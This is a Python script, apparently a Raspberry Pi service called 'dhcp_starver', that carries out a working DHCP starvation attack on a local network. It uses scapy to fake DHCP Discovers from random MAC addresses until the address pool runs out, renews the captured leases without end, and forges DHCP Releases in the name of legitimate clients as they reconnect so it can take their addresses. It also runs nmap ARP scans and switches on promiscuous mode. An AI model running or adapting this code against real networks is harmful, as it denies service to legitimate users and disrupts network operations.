import scapy.all as scapy
import nmap
import time
#import json
import threading
import sched
import netifaces
import logging
from logging.handlers import TimedRotatingFileHandler
#import gzip
#import os
#from datetime import datetime, timedelta # Intervalos de tiempo
import random
import ipaddress
from pyroute2 import IPRoute # Para el modo promiscuo
from datetime import datetime
#from pyroute2.netlink.exceptions import NetlinkError
import sys


# Interface to spoof
iface = None

# Dict of all fake hosts k:MAC, v:fake_host
fake_host_dict = dict()

# Dict of all existing hosts (still managed by original DHCP Server)
existing_host_dict = dict()

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
our_network = ""

class fake_host:
    '''
    Defines basic parameters of a host
    '''
    def __init__(self, mac_address, transaction_id):
        self.ip_address = None
        self.mac_address = mac_address
        self.transaction_id = transaction_id
        self.hostname = "elvispresley"
        self.lease_time = None # IP Address Lease Time offered by DHCP Server
        self.acquisition_time = None # Time when IP Address was obtained
    #def __str__(self):
    #    return f"IP: {self.ip_address}, MAC: {self.mac_address}, hostname: {self.hostname}"
'''
class existing_host:
    
    Defines basic parameters of an existing host
    
    def __init__(self):
        self.ip_address = None
        self.mac_address = None
        self.hostname = None
        self.transaction_id = None
'''

# Define a semaphore for .log/.json file access
file_semaphore = threading.Semaphore()

# Replace this with the path to your JSON file
#json_file = "/home/pi/dhcp_starver/network_scan_results.json"

# Set up logging
log_file = "/home/pi/dhcp_starver/logs/dhcp_starver.log"
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def write_to_log(message):
    '''
    Write message to log file
    '''
    with file_semaphore:
        logger.info(message)


def get_network_params(iface_name):
    """
    Get IP address, MAC address and netmask from selected interface
    """
    try:
        iface = netifaces.ifaddresses(iface_name)
        ip_address = iface[netifaces.AF_INET][0]['addr']
        mac_address = iface[netifaces.AF_LINK][0]['addr']
        network_mask = iface[netifaces.AF_INET][0]['netmask']
        # Obtaining network address
        network_address = ipaddress.ip_network(f"{ip_address}/{network_mask}", strict=False)
        return ip_address, mac_address, network_mask, str(network_address)
    except (KeyError, IndexError):
        return None, None, None


def get_random_mac():
    """
    Returns a string with a totally random MAC address
    """
    mac = "34:" # Our MAC addresses starts in 34 to make it easier to track/debug
    for i in range(10):
        num = random.randint(0, 15)
        if num < 10:
            num = chr(48 + num)
        else:
            num = chr(87 + num)
        mac += num
        if i % 2 == 1:
            mac += ":"
    return mac[:-1]


def get_hosts_from_network(ip_address, netmask):
    """
    Returns a list of all possible assignable IP addresses to hosts on the interface network
    """
    network = ipaddress.IPv4Network(ip_address + "/" + netmask, strict=False)
    # List of avalaible addresses
    address_list = [str(ip_address) for ip_address in network.hosts()] 
    return address_list


def get_transaction_id():
    """
    Returns a 32-bit random number following DHCP Transaction ID format
    """
    transaction_id = random.getrandbits(32)
    return transaction_id


def create_fake_host():
    '''
    Creates a fake host with random MAC address and Trans ID, and adds it to global fake_hosts_dict
    '''
    # Getting fresh random MAC addr and transaction ID for all the DHCP transaction process for this fake host
    trans_id = get_transaction_id()
    mac_address = get_random_mac()
    # Creating a new fake host with no assigned IP address 
    host = fake_host(mac_address, trans_id)
    # Adds it to the global dictionary
    global fake_host_dict
    fake_host_dict[mac_address] = host
    return host


def send_discover(host):
    """
    Send a broadcast DHCP Discover with freshly created fake host's parameters
    """
    mac_address = host.mac_address
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Discover packet
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=host_mac, 
                              xid=trans_id,
                              #flags=bootp_flag)
                              flags=0) # Unicast
                              #flags=0x8000) # Broadcast
    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
                                     ("client_id", b'\x01' + host_mac),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
                                     ("hostname", host.hostname), 
                                     "end"])
    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_discover, verbose=False, iface=iface)
    write_to_log(f"Sending DHCP Discover for MAC address {mac_address}")


def send_request(host):
    """
    Send a broadcast DHCP Request with requested IP address and spoofed mac address
    """
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    mac_address = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                     ("client_id", b'\x01' + mac_address),
                                     ("server_id", dhcp_server_ip),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                     ("requested_addr", host.ip_address), 
                                     ("hostname", host.hostname),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    #scapy.sendp(dhcp_request, verbose=False, iface=interface)
    scapy.sendp(dhcp_request, verbose=False, iface=iface)


def send_renewal_request(host, interface):
    """
    Send Unicast DHCP Request for IP address lease renewal
    """
    ip_address = host.ip_address
    trans_id = host.transaction_id
    hostname = host.hostname
    mac_address = host.mac_address
    global dhcp_server_mac
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=dhcp_server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                     ("client_id", b'\x01' + mac_address),
                                     ("server_id", dhcp_server_ip),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                     ("requested_addr", ip_address), 
                                     ("hostname", hostname),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=interface)
    #scapy.sendp(dhcp_request, verbose=False, iface=iface)


def send_release(mac_address, interface):
    """
    Send DHCP Release
    """
    # Finding the fake host's IP address to release
    host_ip = fake_host_dict[mac_address].ip_address
    hostname = fake_host_dict[mac_address].hostname
    # Getting a random Trans ID
    trans_id = get_transaction_id()
    # Converting MAC addresses
    mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=host_ip, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     #("hostname", hostname), 
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=interface)
    #scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {host_ip}")


def send_release_v2(mac_address, ip_address, hostname):
    """
    Send DHCP Release
    """
    # Finding the fake host's IP address to release
    #host_ip = fake_host_dict[mac_address].ip_address
    # Getting a random Trans ID
    trans_id = get_transaction_id()
    # Converting MAC addresses
    mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     ("hostname", hostname), 
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface="eth0")
    #scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address}")


def handle_dhcp_packet(packet):
    """
    Listens for received DHCP packets
    """
    #interface = packet.sniffed_on
    global fake_host_dict

    # Option 2: DHCP Offer (response to Discover)
    if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 2:
        # Getting client info from BOOTP header - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is for us. If not, captured DHCP Offer is discarded
        if not is_this_mac_ours(host_mac):
            return None
        # Updating the fake host's IP address
        fake_host_dict[host_mac].ip_address = host_ip
        # Getting DHCP server info
        global dhcp_server_ip, dhcp_server_mac
        dhcp_opts = get_dhcp_options(packet)
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src
       
        fake_host = fake_host_dict[host_mac]
        # Send DHCP Request
        send_request(fake_host)
        
    # Option 3: DHCP Request, sent when a device reconnects to network (on broadcast) 
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 3:
        # First check if it's broadcast. Only useful if we're on a mirror port
        if packet[scapy.Ether].dst != "ff:ff:ff:ff:ff:ff":
            return None
        # Obtaining DHCP Options
        dhcp_opts = get_dhcp_options(packet)
        # 
        # global existing_host_dict
        fake_macs = fake_host_dict.keys()
        # existing_macs = existing_host_dict.keys()
        # Getting host's MAC address (sender)
        client_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        '''
        if client_id not in fake_macs and client_id in existing_macs:
            # Esto alomejor no es necesario
            # Updating client's requested IP address
            existing_host_dict[client_id].ip_address = dhcp_opts["requested_addr"]
        # We need to ensure this received packet is not from a fake host
        elif client_id not in fake_macs and client_id not in existing_macs:
        '''
        # In received packet is not from any of ours fake hosts, in from a recently reconnected host
        if client_mac not in fake_macs:
            # If host doesn't exist on dictionary, we create it
            host = fake_host()
            # Setting his params
            if dhcp_opts["requested_addr"]:
                host.ip_address = dhcp_opts["requested_addr"]
            else:
                host.ip_address = "0.0.0.0"
            host.mac_address = client_mac
            host.hostname = dhcp_opts["hostname"].decode('ascii')
            host.transaction_id = packet[scapy.BOOTP].xid
            # Adding existing host to diccionary
            existing_host_dict[client_mac] = host
            # Sending DHCP Release
            send_release_v2(host.mac_address, host.ip_address, host.hostname)

            # Now we try to get the recently released IP address
            time.sleep(5)
            #send_discover(interface)
            # Create a new ficticious host and adds it to the dictionary
            fake_host = create_fake_host()
            fake_host_dict[fake_host.mac_address] = fake_host
            # Sending discover
            send_discover(fake_host)
            
          
    # Option 5: DHCP ACK, IP address successfully linked to host       
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
        # Getting client info - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is for us. Only captured if device is connected to a mirror port
        if not is_this_mac_ours(host_mac) or host_mac == our_mac_address:
            write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
            return None
    
        # Updating the fake host's attributes with final decision
        dhcp_opts_dict = get_dhcp_options(packet)
        fake_host_dict[host_mac].ip_address = host_ip
        fake_host_dict[host_mac].lease_time = dhcp_opts_dict['lease_time']
        fake_host_dict[host_mac].acquisition_time = datetime.now()
        write_to_log(f"ACK received: {host_ip} successfully linked to {host_mac}")

    # Option 6: DHCP NAK, unable to obtain a dynamic IP address
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 6:
        write_to_log(f"NAK received! :(")
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        # Check if packet is for us
        if is_this_mac_ours(host_mac):
            # Starting again DHCP handshake. Sending new DHCP Discover
            send_discover(fake_host_dict[host_mac])
        # Removing fake host
        # del fake_host_dict[host_mac]

    else:
        None
    

def is_this_mac_ours(mac_address):
    '''
    Returns true if MAC address belongs to a fake host
    '''
    if mac_address in fake_host_dict:
        return True
    else:
        return False


def mac_to_str(bytes_value):
    '''
    Converts bytes sequence to standard hex MAC address format
    '''
    hex_string = ''.join('{:02x}'.format(byte) for byte in bytes_value)
    formatted_mac_address = ':'.join(hex_string[i:i+2] for i in range(0, 12, 2))
    return formatted_mac_address


def get_dhcp_options(packet):
    '''
    Returns a dict with the packet's DHCP Options
    '''
    dhcp_opts = packet.getlayer(scapy.DHCP).fields["options"]
    dhcp_opts_dict = dict()
    for opt in dhcp_opts:
        # Obtaining all DHCP options until option "end"
        if opt == "end":
            break
        if isinstance(opt, tuple):
            # Ignoring other variables inside a same option, like 2nd DNS Servers, etc. Not useful right now
            dhcp_opts_dict[opt[0]] = opt[1]
        else:
            pass
    return dhcp_opts_dict


def enable_promiscuous_mode(iface, enable):
    """
    Enables/disable promiscuous mode on selected interface
    """
    ip = IPRoute()
    idx = ip.link_lookup(ifname=iface)[0]
    if enable:
        ip.link('set', index=idx, promisc=1)
    else:
        ip.link('set', index=idx, promisc=0)
    ip.close()


def clean_unused_fake_hosts():
    '''
    Removes fake hosts with no IP address assigned by DHCP Server
    '''
    host_to_remove = []
    global fake_host_dict
    for mac, fake_host in fake_host_dict.items():
        if fake_host.ip_address == None:
            host_to_remove.append(mac)
    for mac in host_to_remove:
        del fake_host_dict[mac]


def is_ip_renew_needed(lease_time, acquisition_time):
    '''
    Compares adquisition time and time now to evaluate if a IP renewal is needed
    '''
    # Sometimes lease time/acquisition_time are not correctly assigned to fake host. idk
    try:
        threshold = 0.5 * lease_time
        time_diff = datetime.now() - acquisition_time
    except TypeError:
        # Junky solution... Forcing IP renew
        return True
    
    if threshold < time_diff.total_seconds():
        return True
    else:
        return False


def renew_hosts_ip_leases(interface):
    '''
    For every fake host, decides if a new DHCP Request is needed to keep current IP address linked to host
    '''
    for host in fake_host_dict.values():
        if is_ip_renew_needed(host.lease_time, host.acquisition_time):
            # Resetting Transaction ID
            host.transaction_id = get_transaction_id()
            # Unicast DHCP Request to renew IP address lease
            send_renewal_request(host, interface)
            # Since there's some DHCP servers who doesn't notify the successfull renewal, manual update of host's acquisition_time is needed
            #global fake_host_dict
            #fake_host_dict[host.mac_address].acquisition_time = datetime.now()


def starve_dhcp_server(number, delay):
    '''
    Sends a defined quantity of DHCP Discover packets
    '''
    for i in range(number):
        # Create a new ficticious host and adds it to the dictionary
        fake_host = create_fake_host()
        fake_host_dict[fake_host.mac_address] = fake_host
        # Sending discover
        send_discover(fake_host)
        #send_discover(iface)
        time.sleep(delay)
    write_to_log(f"{number} DHCP Discover(s) have been sent")


def ip_lease_renewal(renewal_time):
    '''
    Performs (if needed) a IP Lease Renewal on all fake hosts every 'renewal_time' seconds
    '''
    while True:
            
            write_to_log(f"Trying IP Lease renewal...")
            renew_hosts_ip_leases(iface)
            # Sending a DHCP Discover to catch any expired IP lease
            #send_discover(iface)
            write_to_log(f"Next try in {renewal_time} seconds")
            time.sleep(renewal_time)
            # Removing hosts with no IP linked
            clean_unused_fake_hosts()

            
def release_all_ips():
    '''
    Sends a DHCP Release for every fake host
    '''
    for host in fake_host_dict.values():
        send_release(host.mac_address, iface)
    write_to_log(f"All IP addresses have been released!")
    

def perform_arp_scan(network):
    '''
    Perform ans ARP scan
    '''
    write_to_log(f"Starting ARP Request scan...")
    ip_mac_data = arp_scan(network)
    
    for ip, mac in ip_mac_data:
        write_to_log(f"ARP Scan: Found existing host {ip} - {mac}")
        # Ignoring DHCP server
        if ip != dhcp_server_ip:
            None



def arp_scan(network):
    '''
    Performs an nmap ping and ARP scan to find existing hosts on the network
    '''
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network, arguments='-sP -PR')
        # For every found host creates a duple IP Address - MAC Address
        ip_mac_data = [(x, nm[x]['addresses']['mac']) for x in nm.all_hosts() if 'mac' in nm[x]['addresses']]
        return ip_mac_data
    except Exception as e:
        write_to_log(f"Error during scan: {e}")
        return None
    

def release_and_request():
    '''
    Sends a DHCP Release and then DHCP Request to catch that IP address
    '''
    None

def main():
    global iface
    iface = "eth0"
    write_to_log(f"Starting service on interface {iface}")

    # Getting interface parameters
    global our_ip_address, our_mac_address, our_netmask, our_network
    our_ip_address, our_mac_address, our_netmask, our_network = get_network_params(iface)
    
    # Getting all host avalaible IP addresses for network
    avalaible_hosts = get_hosts_from_network(our_ip_address, our_netmask)
    max_hosts = len(avalaible_hosts) - 1
    write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
    write_to_log(f"There's a total of {max_hosts} possible hosts")
    
    # Enabling promisc mode on selected interface (just in case)
    enable_promiscuous_mode(iface, True)

    # Starting asynchronous DHCP packet sniffer
    dhcp_sniffer = scapy.AsyncSniffer(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
    dhcp_sniffer.start()

    # Starting asynchronous ARP packet sniffer
    #arp_sniffer = scapy.AsyncSniffer(filter="arp", prn=handle_arp_packet)
    #arp_sniffer.start()

    # Getting all avalaible IP from network
    delay_between_discovers = 0.1 # seconds
    starve_dhcp_server(max_hosts, delay_between_discovers)

    time_to_wait_to_receive_all_ack = 10  # seconds

    write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
    time.sleep(time_to_wait_to_receive_all_ack)
    # Removing all fake hosts with no IP address linked due to pool exhaustion
    clean_unused_fake_hosts()
  
    # Performs an ARP scan to find all hosts connected to network
    time_between_arp_scans = 600 # seconds
    # Setting scheduler
    arp_scan_scheduler = sched.scheduler(time.time, time.sleep)
    arp_scan_scheduler.enter(delay=time_between_arp_scans, priority=1, action=perform_arp_scan, argument=(our_network,))
    # Creating thread
    arp_scan_thread = threading.Thread(target=arp_scan_scheduler.run)
    
    
    #perform_arp_scan(our_network)


    # Infinite loop to do IP release renewal on every fake host when necessary
    time_interval_to_check_if_ip_renewal_is_necessary = 60 # seconds
    try:
        # First ARP Scan, then the scheduler performs it every t seconds in a separated thread
        perform_arp_scan(our_network)
        arp_scan_thread.start()
        ip_lease_renewal(time_interval_to_check_if_ip_renewal_is_necessary)
    except Exception as e:
        # If an exception occurs (p.e. KeyboardInterrupt) all IP's will be released
        #print(e)
        #with contextlib.suppress():
        #    pass
        sys.exit(0)
        #print(f"Program exception ocurred (KeyboardInterrupt?), releasing all IP addresses")
    finally:
        # Stop ARP scan thread
        #write_to_log("Stopping ARP scan thread...")
        #arp_scan_scheduler.cancel(event=arp_scan_thread)
        #arp_scan_thread.join()
        #stop_event.set()
        #arp_scan_thread.join()
        # Releasing all IP addresses
        release_all_ips()
        # Disabling promiscuous mode
        enable_promiscuous_mode(iface, False)
        write_to_log(f"Service terminated")
    

if __name__ == "__main__":
    main()

